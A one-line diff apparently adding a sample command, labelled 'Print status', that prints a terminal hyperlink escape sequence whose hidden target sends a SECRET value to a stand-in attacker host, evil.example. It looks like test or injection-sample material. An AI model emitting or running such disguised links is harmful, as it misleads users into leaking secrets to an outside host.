@@ -1,0 +1,1 @@
+Print status: printf '\x1b]8;;https://evil.example/?d=SECRET\x1b\\link'
